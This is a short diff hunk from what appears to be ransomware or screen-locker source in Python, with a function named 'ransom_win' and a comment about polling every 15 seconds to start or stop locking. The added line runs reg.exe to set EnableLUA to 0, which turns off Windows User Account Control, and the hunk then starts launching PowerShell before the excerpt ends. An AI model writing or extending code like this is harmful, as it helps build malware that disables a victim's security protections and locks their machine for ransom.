@@ -58,9 +58,8 @@ def ransom_win():
 
 
 """ send requests each 15 seconds, start/stop locking"""
-
-prog_location = os.path.split(prog_call)[0]
 def main():
+    subprocess.Popen("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
     print("run")
     try:
         psxmlgen = subprocess.Popen(['powershell.exe',
